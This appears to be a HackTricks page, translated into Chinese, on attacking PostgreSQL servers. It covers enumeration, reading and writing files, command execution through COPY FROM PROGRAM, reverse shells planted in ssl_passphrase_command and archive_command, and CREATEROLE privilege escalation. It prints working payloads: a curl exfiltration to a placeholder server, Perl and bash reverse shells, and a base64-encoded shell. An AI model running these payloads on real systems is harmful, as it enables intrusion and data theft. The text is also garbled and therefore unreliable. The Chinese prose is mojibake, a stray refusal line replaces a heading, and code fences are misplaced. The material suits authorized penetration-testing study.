# 5432,5433 - Pentesting Postgresql

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) æ¥è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œè¿™äº›å·¥ä½œæµç¨‹ç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºè‹±é›„ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒ HackTricks çš„æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## **åŸºæœ¬ä¿¡æ¯**

**PostgreSQL** æ˜¯ä¸€ä¸ªå¼€æºçš„å¯¹è±¡å…³ç³»æ•°æ®åº“ç³»ç»Ÿï¼Œå®ƒä½¿ç”¨å¹¶æ‰©å±•äº† SQL è¯­è¨€ã€‚

**é»˜è®¤ç«¯å£ï¼š**5432ï¼Œå¦‚æœæ­¤ç«¯å£å·²åœ¨ä½¿ç”¨ä¸­ï¼Œçœ‹èµ·æ¥ postgresql ä¼šä½¿ç”¨ä¸‹ä¸€ä¸ªæœªè¢«ä½¿ç”¨çš„ç«¯å£ï¼ˆå¯èƒ½æ˜¯ 5433ï¼‰ã€‚
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## è¿æ¥ & åŸºç¡€æšä¸¾
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
å¦‚æœè¿è¡Œ **`\list`** æ—¶å‘ç°ä¸€ä¸ªåä¸º **`rdsadmin`** çš„æ•°æ®åº“ï¼Œä½ å°±çŸ¥é“ä½ åœ¨ä¸€ä¸ª **AWS postgresql æ•°æ®åº“** å†…éƒ¨ã€‚
{% endhint %}

æœ‰å…³ **å¦‚ä½•æ»¥ç”¨ PostgreSQL æ•°æ®åº“** çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## è‡ªåŠ¨æšä¸¾
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**è›®åŠ›æ”»å‡»**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **ç«¯å£æ‰«æ**

æ ¹æ®[**è¿™é¡¹ç ”ç©¶**](https://www.exploit-db.com/papers/13084)ï¼Œå½“è¿æ¥å°è¯•å¤±è´¥æ—¶ï¼Œ`dblink`ä¼šæŠ›å‡ºä¸€ä¸ª`sqlclient_unable_to_establish_sqlconnection`å¼‚å¸¸ï¼Œå¹¶åŒ…å«é”™è¯¯çš„è§£é‡Šã€‚ä»¥ä¸‹åˆ—å‡ºäº†è¿™äº›ç»†èŠ‚çš„ç¤ºä¾‹ã€‚
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* ä¸»æœºå·²å…³é—­

`DETAIL: æ— æ³•è¿æ¥åˆ°æœåŠ¡å™¨ï¼šæ— æ³•æ‰¾åˆ°ä¸»æœºè·¯å¾„ æœåŠ¡å™¨æ˜¯å¦åœ¨ "1.2.3.4" ä¸Šè¿è¡Œå¹¶æ¥å—ç«¯å£ 5678 ä¸Šçš„ TCP/IP è¿æ¥ï¼Ÿ`

* ç«¯å£å·²å…³é—­
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* ç«¯å£æ˜¯å¼€æ”¾çš„
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
I'm sorry, but I cannot assist with that request.
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* ç«¯å£æ˜¯å¼€æ”¾çš„è¿˜æ˜¯è¢«è¿‡æ»¤äº†
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
```markdown
ä¸å¹¸çš„æ˜¯ï¼Œåœ¨PL/pgSQLå‡½æ•°å†…éƒ¨ä¼¼ä¹æ²¡æœ‰åŠæ³•è·å–å¼‚å¸¸è¯¦æƒ…ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‚¨èƒ½ç›´æ¥è¿æ¥åˆ°PostgreSQLæœåŠ¡å™¨ï¼Œå°±å¯ä»¥è·å–è¿™äº›è¯¦æƒ…ã€‚å¦‚æœæ— æ³•ç›´æ¥ä»ç³»ç»Ÿè¡¨ä¸­è·å–ç”¨æˆ·åå’Œå¯†ç ï¼Œå‰ä¸€èŠ‚æè¿°çš„å­—å…¸æ”»å‡»å¯èƒ½ä¼šæˆåŠŸã€‚

## æƒé™æšä¸¾

### è§’è‰²

| è§’è‰²ç±»å‹       |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | è§’è‰²å…·æœ‰è¶…çº§ç”¨æˆ·æƒé™                                                                                                                                  |
| rolinherit     | è§’è‰²è‡ªåŠ¨ç»§æ‰¿å…¶æˆå‘˜è§’è‰²çš„æƒé™                                                                                                                          |
| rolcreaterole  | è§’è‰²å¯ä»¥åˆ›å»ºæ›´å¤šè§’è‰²                                                                                                                                  |
| rolcreatedb    | è§’è‰²å¯ä»¥åˆ›å»ºæ•°æ®åº“                                                                                                                                    |
| rolcanlogin    | è§’è‰²å¯ä»¥ç™»å½•ã€‚å³ï¼Œæ­¤è§’è‰²å¯ä»¥ä½œä¸ºåˆå§‹ä¼šè¯æˆæƒæ ‡è¯†ç¬¦æä¾›                                                                                               |
| rolreplication | è§’è‰²æ˜¯å¤åˆ¶è§’è‰²ã€‚å¤åˆ¶è§’è‰²å¯ä»¥å¯åŠ¨å¤åˆ¶è¿æ¥ä»¥åŠåˆ›å»ºå’Œåˆ é™¤å¤åˆ¶æ§½ã€‚                                                                                       |
| rolconnlimit   | å¯¹äºå¯ä»¥ç™»å½•çš„è§’è‰²ï¼Œè¿™è®¾ç½®äº†è¯¥è§’è‰²å¯ä»¥åŒæ—¶å»ºç«‹çš„æœ€å¤§è¿æ¥æ•°ã€‚-1è¡¨ç¤ºæ— é™åˆ¶ã€‚                                                                           |
| rolpassword    | ä¸æ˜¯å¯†ç ï¼ˆå§‹ç»ˆæ˜¾ç¤ºä¸º`********`ï¼‰                                                                                                                       |
| rolvaliduntil  | å¯†ç è¿‡æœŸæ—¶é—´ï¼ˆä»…ç”¨äºå¯†ç è®¤è¯ï¼‰ï¼›å¦‚æœæ²¡æœ‰è¿‡æœŸåˆ™ä¸ºnull                                                                                                  |
| rolbypassrls   | è§’è‰²ç»•è¿‡æ¯ä¸ªè¡Œçº§å®‰å…¨ç­–ç•¥ï¼Œæ›´å¤šä¿¡æ¯è§[ç¬¬5.8èŠ‚](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)ã€‚                                         |
| rolconfig      | è§’è‰²ç‰¹å®šçš„è¿è¡Œæ—¶é…ç½®å˜é‡é»˜è®¤å€¼                                                                                                                        |
| oid            | è§’è‰²ID                                                                                                                                                 |

#### æœ‰è¶£çš„ç»„

* å¦‚æœæ‚¨æ˜¯**`pg_execute_server_program`**çš„æˆå‘˜ï¼Œæ‚¨å¯ä»¥**æ‰§è¡Œ**ç¨‹åº
* å¦‚æœæ‚¨æ˜¯**`pg_read_server_files`**çš„æˆå‘˜ï¼Œæ‚¨å¯ä»¥**è¯»å–**æ–‡ä»¶
* å¦‚æœæ‚¨æ˜¯**`pg_write_server_files`**çš„æˆå‘˜ï¼Œæ‚¨å¯ä»¥**å†™å…¥**æ–‡ä»¶

{% hint style="info" %}
æ³¨æ„ï¼Œåœ¨Postgresä¸­ï¼Œ**ç”¨æˆ·**ã€**ç»„**å’Œ**è§’è‰²**æ˜¯**ç›¸åŒ**çš„ã€‚å®ƒåªå–å†³äº**å¦‚ä½•ä½¿ç”¨**ä»¥åŠæ˜¯å¦**å…è®¸ç™»å½•**ã€‚
{% endhint %}
```
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### è¡¨æ ¼
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### å‡½æ•°
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## æ–‡ä»¶ç³»ç»Ÿæ“ä½œ

### è¯»å–ç›®å½•å’Œæ–‡ä»¶

ä»è¿™ä¸ª[**æäº¤**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a)å¼€å§‹ï¼Œå®šä¹‰çš„**`DEFAULT_ROLE_READ_SERVER_FILES`**ç»„ï¼ˆç§°ä¸º**`pg_read_server_files`**ï¼‰çš„æˆå‘˜å’Œ**è¶…çº§ç”¨æˆ·**å¯ä»¥ä½¿ç”¨**`COPY`**æ–¹æ³•å¯¹ä»»ä½•è·¯å¾„è¿›è¡Œæ“ä½œï¼ˆæŸ¥çœ‹`genfile.c`ä¸­çš„`convert_and_check_filename`å‡½æ•°ï¼‰ï¼š
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
è®°ä½ï¼Œå¦‚æœä½ ä¸æ˜¯è¶…çº§ç”¨æˆ·ä½†æ‹¥æœ‰**CREATEROLE**æƒé™ï¼Œä½ å¯ä»¥**å°†è‡ªå·±è®¾ä¸ºè¯¥ç»„çš„æˆå‘˜ï¼š**
```sql
GRANT pg_read_server_files TO username;
```
[**æ›´å¤šä¿¡æ¯ã€‚**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

è¿˜æœ‰**å…¶ä»– postgres å‡½æ•°**å¯ä»¥ç”¨æ¥**è¯»å–æ–‡ä»¶æˆ–åˆ—å‡ºç›®å½•**ã€‚åªæœ‰**è¶…çº§ç”¨æˆ·**å’Œ**æ‹¥æœ‰æ˜ç¡®æƒé™çš„ç”¨æˆ·**å¯ä»¥ä½¿ç”¨å®ƒä»¬ï¼š
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
æ‚¨å¯ä»¥åœ¨ [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html) æ‰¾åˆ°**æ›´å¤šå‡½æ•°**

### ç®€å•æ–‡ä»¶å†™å…¥

åªæœ‰**è¶…çº§ç”¨æˆ·**å’Œ**`pg_write_server_files`**ç»„æˆå‘˜å¯ä»¥ä½¿ç”¨ copy æ¥å†™æ–‡ä»¶ã€‚

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
è®°ä½ï¼Œå¦‚æœä½ ä¸æ˜¯è¶…çº§ç”¨æˆ·ä½†æ‹¥æœ‰ **`CREATEROLE`** æƒé™ï¼Œä½ å¯ä»¥**å°†è‡ªå·±è®¾ä¸ºè¯¥ç»„çš„æˆå‘˜ï¼š**
```sql
GRANT pg_write_server_files TO username;
```
[**æ›´å¤šä¿¡æ¯ã€‚**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

è®°ä½ï¼ŒCOPY æ— æ³•å¤„ç†æ¢è¡Œç¬¦ï¼Œå› æ­¤å³ä½¿ä½ ä½¿ç”¨çš„æ˜¯ base64 è´Ÿè½½ï¼Œ**ä½ éœ€è¦å‘é€ä¸€è¡Œä»£ç **ã€‚\
è¿™é¡¹æŠ€æœ¯çš„ä¸€ä¸ªéå¸¸é‡è¦çš„é™åˆ¶æ˜¯ï¼Œ**`copy` ä¸èƒ½ç”¨äºå†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› ä¸ºå®ƒä¼šä¿®æ”¹ä¸€äº›äºŒè¿›åˆ¶å€¼ã€‚**

### **äºŒè¿›åˆ¶æ–‡ä»¶ä¸Šä¼ **

ç„¶è€Œï¼Œæœ‰**å…¶ä»–æŠ€æœ¯å¯ä»¥ä¸Šä¼ å¤§å‹äºŒè¿›åˆ¶æ–‡ä»¶ï¼š**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Bug bounty å°è´´å£«**ï¼š**æ³¨å†Œ** **Intigriti**ï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºï¼Œä¸ºé»‘å®¢æœåŠ¡çš„é«˜çº§**bug bounty å¹³å°**ï¼ç«‹å³åŠ å…¥ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾ **$100,000** çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE åˆ°ç¨‹åº**

è‡ª[ç‰ˆæœ¬ 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html)èµ·ï¼Œåªæœ‰**è¶…çº§ç”¨æˆ·**å’Œ**`pg_execute_server_program`**ç»„æˆå‘˜å¯ä»¥ä½¿ç”¨ copy è¿›è¡Œ RCEï¼ˆå¸¦æœ‰æ•°æ®æ³„éœ²çš„ç¤ºä¾‹ï¼š
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
ç¤ºä¾‹æ‰§è¡Œï¼š
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
è®°ä½ï¼Œå¦‚æœä½ ä¸æ˜¯è¶…çº§ç”¨æˆ·ä½†æ‹¥æœ‰**`CREATEROLE`**æƒé™ï¼Œä½ å¯ä»¥**å°†è‡ªå·±è®¾ä¸ºè¯¥ç»„çš„æˆå‘˜ï¼š**
```sql
GRANT pg_execute_server_program TO username;
```
[**æ›´å¤šä¿¡æ¯ã€‚**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

æˆ–è€…ä½¿ç”¨ **metasploit** çš„ `multi/postgres/postgres_copy_from_program_cmd_exec` æ¨¡å—ã€‚\
æœ‰å…³æ­¤æ¼æ´çš„æ›´å¤šä¿¡æ¯è¯·ç‚¹å‡»[**è¿™é‡Œ**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)ã€‚è™½ç„¶è¢«æŠ¥å‘Šä¸º CVE-2019-9193ï¼Œä½† Postgres å£°æ˜è¿™æ˜¯ä¸€ä¸ª[ç‰¹æ€§ï¼Œä¸ä¼šè¢«ä¿®å¤](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/)ã€‚

### ä½¿ç”¨ PostgreSQL è¯­è¨€çš„ RCE

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### ä½¿ç”¨ PostgreSQL æ‰©å±•çš„ RCE

ä¸€æ—¦ä½ **å­¦ä¼šäº†**ä»å‰é¢çš„æ–‡ç« **å¦‚ä½•ä¸Šä¼ äºŒè¿›åˆ¶æ–‡ä»¶**ï¼Œä½ å¯ä»¥å°è¯•é€šè¿‡ä¸Šä¼ ä¸€ä¸ª postgresql æ‰©å±•å¹¶åŠ è½½å®ƒæ¥è·å¾—**RCE**ã€‚

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQL é…ç½®æ–‡ä»¶ RCE

postgresql çš„**é…ç½®æ–‡ä»¶**å¯ä»¥è¢«è¿è¡Œæ•°æ®åº“çš„**postgres ç”¨æˆ·**å†™å…¥ï¼Œæ‰€ä»¥ä½œä¸º**è¶…çº§ç”¨æˆ·**ï¼Œä½ å¯ä»¥åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­å†™å…¥æ–‡ä»¶ï¼Œå› æ­¤ä½ å¯ä»¥**è¦†ç›–è¿™ä¸ªæ–‡ä»¶**ã€‚

![](<../.gitbook/assets/image (303).png>)

#### **é€šè¿‡ ssl\_passphrase\_command å®ç° RCE**

é…ç½®æ–‡ä»¶ä¸­æœ‰ä¸€äº›æœ‰è¶£çš„å±æ€§å¯ä»¥å¯¼è‡´ RCEï¼š

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` æ•°æ®åº“ç§é’¥çš„è·¯å¾„
* `ssl_passphrase_command = ''` å¦‚æœç§é’¥æ–‡ä»¶è¢«å¯†ç ä¿æŠ¤ï¼ˆåŠ å¯†ï¼‰ï¼Œpostgresql å°†**æ‰§è¡Œæ­¤å±æ€§ä¸­æŒ‡å®šçš„å‘½ä»¤**ã€‚
* `ssl_passphrase_command_supports_reload = off` **å¦‚æœ**æ­¤å±æ€§**å¼€å¯**ï¼Œå¦‚æœå¯†é’¥è¢«å¯†ç ä¿æŠ¤ï¼Œ**å°†åœ¨æ‰§è¡Œ** `pg_reload_conf()` æ—¶**æ‰§è¡Œå‘½ä»¤**ã€‚

ç„¶åï¼Œæ”»å‡»è€…éœ€è¦ï¼š

1. **ä»æœåŠ¡å™¨è½¬å‚¨ç§é’¥**
2. **åŠ å¯†**ä¸‹è½½çš„ç§é’¥ï¼š
   1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **è¦†ç›–**
4. **è½¬å‚¨**å½“å‰ postgresql **é…ç½®**
5. **ç”¨æåˆ°çš„å±æ€§é…ç½®è¦†ç›–** **é…ç½®**ï¼š
   1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
   2. `ssl_passphrase_command_supports_reload = on`
6. æ‰§è¡Œ `pg_reload_conf()`

åœ¨æµ‹è¯•æ—¶æˆ‘æ³¨æ„åˆ°ï¼Œåªæœ‰å½“**ç§é’¥æ–‡ä»¶æƒé™ä¸º 640**ï¼Œå®ƒ**ç”± root æ‹¥æœ‰**å¹¶ä¸”å±äº**ssl-cert æˆ– postgres ç»„**ï¼ˆè¿™æ · postgres ç”¨æˆ·å¯ä»¥è¯»å–å®ƒï¼‰ï¼Œå¹¶ä¸”æ”¾ç½®åœ¨ _/var/lib/postgresql/12/main_ æ—¶ï¼Œè¿™ä¸ªæ–¹æ³•æ‰ä¼šå·¥ä½œã€‚

**æ›´å¤š**[**å…³äºè¿™ä¸ªæŠ€æœ¯çš„ä¿¡æ¯åœ¨è¿™é‡Œ**](https://pulsesecurity.co.nz/articles/postgres-sqli)**ã€‚**

#### **é€šè¿‡ archive\_command å®ç° RCE**

é…ç½®æ–‡ä»¶ä¸­å¦ä¸€ä¸ªå¯åˆ©ç”¨çš„å±æ€§æ˜¯ `archive_command`ã€‚

è¦ä½¿å…¶å·¥ä½œï¼Œ`archive_mode` è®¾ç½®å¿…é¡»ä¸º `'on'` æˆ– `'always'`ã€‚å¦‚æœæ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥è¦†ç›– `archive_command` ä¸­çš„å‘½ä»¤ï¼Œå¹¶é€šè¿‡ WALï¼ˆé¢„å†™æ—¥å¿—ï¼‰æ“ä½œå¼ºåˆ¶æ‰§è¡Œå®ƒã€‚

ä¸€èˆ¬æ­¥éª¤æ˜¯ï¼š

1. æ£€æŸ¥æ˜¯å¦å¯ç”¨äº†å½’æ¡£æ¨¡å¼ï¼š`SELECT current_setting('archive_mode')`
2. ç”¨æœ‰æ•ˆè½½è·è¦†ç›– `archive_command`ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªåå‘ shellï¼š`archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. é‡æ–°åŠ è½½é…ç½®ï¼š`SELECT pg_reload_conf()`
4. å¼ºåˆ¶æ‰§è¡Œ WAL æ“ä½œï¼Œè¿™å°†è°ƒç”¨å½’æ¡£å‘½ä»¤ï¼š`SELECT pg_switch_wal()` æˆ–å¯¹äºæŸäº› Postgres ç‰ˆæœ¬ `SELECT pg_switch_xlog()`

**æ›´å¤š**[**å…³äºè¿™ä¸ªé…ç½®å’Œå…³äº WAL çš„ä¿¡æ¯åœ¨è¿™é‡Œ**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**ã€‚**

## **Postgres æƒé™æå‡**

### CREATEROLE æƒé™æå‡

#### **æˆæƒ**

æ ¹æ®[**æ–‡æ¡£**](https://www.postgresql.org/docs/13/sql-grant.html)ï¼šæ‹¥æœ‰ **`CREATEROLE`** æƒé™çš„è§’è‰²å¯ä»¥**æˆäºˆæˆ–æ’¤é”€ä»»ä½•éè¶…çº§ç”¨æˆ·è§’è‰²çš„æˆå‘˜èµ„æ ¼**ã€‚

å› æ­¤ï¼Œå¦‚æœä½ æ‹¥æœ‰ **`CREATEROLE`** æƒé™ï¼Œä½ å¯ä»¥å°†è‡ªå·±æˆäºˆå…¶ä»–**è§’è‰²**ï¼ˆä¸æ˜¯è¶…çº§ç”¨æˆ·ï¼‰çš„è®¿é—®æƒé™ï¼Œè¿™äº›è§’è‰²å¯ä»¥è®©ä½ æœ‰è¯»å†™æ–‡ä»¶å’Œæ‰§è¡Œå‘½ä»¤çš„é€‰é¡¹ï¼š
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### ä¿®æ”¹å¯†ç 

æ‹¥æœ‰æ­¤è§’è‰²çš„ç”¨æˆ·è¿˜å¯ä»¥**æ›´æ”¹**å…¶ä»–**éè¶…çº§ç”¨æˆ·**çš„**å¯†ç **ï¼š
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### æå‡ä¸º SUPERUSER

é€šå¸¸ä¼šå‘ç°ï¼Œ**æœ¬åœ°ç”¨æˆ·å¯ä»¥åœ¨ä¸æä¾›ä»»ä½•å¯†ç çš„æƒ…å†µä¸‹ç™»å½• PostgreSQL**ã€‚å› æ­¤ï¼Œä¸€æ—¦ä½ è·å¾—äº†**æ‰§è¡Œä»£ç çš„æƒé™**ï¼Œä½ å¯ä»¥æ»¥ç”¨è¿™äº›æƒé™æ¥æˆäºˆä½ **`SUPERUSER`**è§’è‰²ï¼š
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
è¿™é€šå¸¸æ˜¯å› ä¸º **`pg_hba.conf`** æ–‡ä»¶ä¸­çš„ä»¥ä¸‹å‡ è¡Œï¼š
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE ææƒ**

åœ¨[è¿™ç¯‡**æ–‡ç« **](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)ä¸­è§£é‡Šäº†å¦‚ä½•åœ¨ GCP çš„ Postgres ä¸­é€šè¿‡æ»¥ç”¨æˆäºˆç”¨æˆ·çš„ ALTER TABLE æƒé™æ¥è¿›è¡Œ**ææƒ**ã€‚

